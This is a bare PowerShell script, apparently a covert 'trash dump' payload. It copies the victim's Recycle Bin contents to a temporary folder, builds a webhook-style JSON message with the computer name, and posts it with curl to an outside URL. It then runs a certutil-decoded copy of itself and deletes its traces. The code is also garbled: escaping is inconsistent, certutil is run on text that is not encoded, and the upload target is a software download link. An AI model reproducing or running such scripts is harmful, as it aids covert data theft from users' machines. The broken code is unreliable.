$TempFile = "$env:TEMP\temp.ps1"
$File = "$env:TEMP\l.ps1"
$payloadFile = "$env:TEMP\payload.json"

# PowerShell script content
$scriptContent = @"
# Recycle Bin Interaction
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.NameSpace(0xA)
$tempDir = [System.IO.Path]::Combine(\$env:TEMP, [System.Guid]::NewGuid().ToString())
New-Item -Path \$tempDir -ItemType Directory

# Copy Recycle Bin items to temporary directory
foreach (\$item in \$recycleBin.Items()) {
    \$itemPath = \$item.Path
    \$destPath = [System.IO.Path]::Combine(\$tempDir, \$item.Name)
    Copy-Item -Path \$itemPath -Destination \$destPath -Recurse
}

# Create payload
$payload = @{
    username = \$env:ComputerName
    embedded = @(
        @{
            description = "Trash Dump Complete!"
            color = 552583
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        }
    )
}
\$payloadJson = \$payload | ConvertTo-Json -Depth 4
Set-Content -Path "$payloadFile" -Value \$payloadJson

# Upload payload
$curlCommand = @(
    'curl.exe',
    '-F', ("payload_json=<\$payloadFile>"),
    '-F', ("file=\$(Get-Content -Path \$payloadFile)"),
    '-F', ("filename=payload.json"),
    'https://www.7-zip.org/a/7za920.zip'
)
& $curlCommand[0] $curlCommand[1..($curlCommand.Length - 1)]

# Cleanup
Remove-Item -Path \$tempDir -Recurse -Force
Remove-Item -Path "$payloadFile" -Force
Write-Host "Export Complete!"
"@

# Write and execute the script
Set-Content -Path $TempFile -Value $scriptContent
certutil -f -decode $TempFile $File | Out-Null
& $File
exit